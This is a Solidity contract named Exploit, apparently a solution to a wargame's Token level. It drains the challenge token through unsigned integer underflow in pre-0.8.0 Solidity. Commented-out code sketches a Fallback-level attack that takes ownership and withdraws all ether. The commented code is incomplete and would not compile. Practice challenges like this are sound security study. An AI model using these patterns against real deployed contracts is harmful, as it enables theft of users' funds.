// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/Token.sol';
import 'hardhat/console.sol';

contract Exploit {
    Token public target;

    //uint256 overflow before solidity 0.8.0
    constructor (Token _target) public {

        target = _target;
        uint256 balance = target.balanceOf(address(this));
        console.log("msg.sender's balance:%s", balance);
        require(balance + 1 > balance, "overflow");

        target.transfer(tx.origin, balance+1); 
      
        balance = target.balanceOf(address(this));
        console.log("msg.sender's balance:%s", balance);
    }

    //   constructor (Fallback _fallback) payable{
    //     uint256 amount = 0.0001 ether;
    //     target = _fallback;
        // target.contribute{value:amount}(); //call contribute with 0.0001 eth
        // require(amount == target.getContribution(), "contribution not match");

        // //change owner by call receive function
        // (bool sent, ) = address(target).call{value:amount}("");
        // require(sent, "fail to sent");
        // require(address(this) == target.owner(), "unexpected target owner");

        // //withdraw all
        // target.withdraw();

        // //check
        // require(address(target).balance == 0, "some ethers left");
    //}

    // function contribute () public payable{
    //     uint256 amount = 0.0001 ether;
    //     target.contribute{value:amount}(); //call contribute with 0.0001 eth
    //     require(amount == target.getContribution(), "contribution not match");
    // }

    // function send () payable{
    //     (bool sent, ) = address(target).call{value:amount}("");
    //     require(sent, "fail to sent");
    //     require(address(this) == target.owner(), "unexpected target owner");
    // }

    // function withdraw () {
    //     (bool sent, ) = address(target).call{value:amount}("");
    //     require(sent, "fail to sent");
    //     require(address(this) == target.owner(), "unexpected target owner");
    // }


}
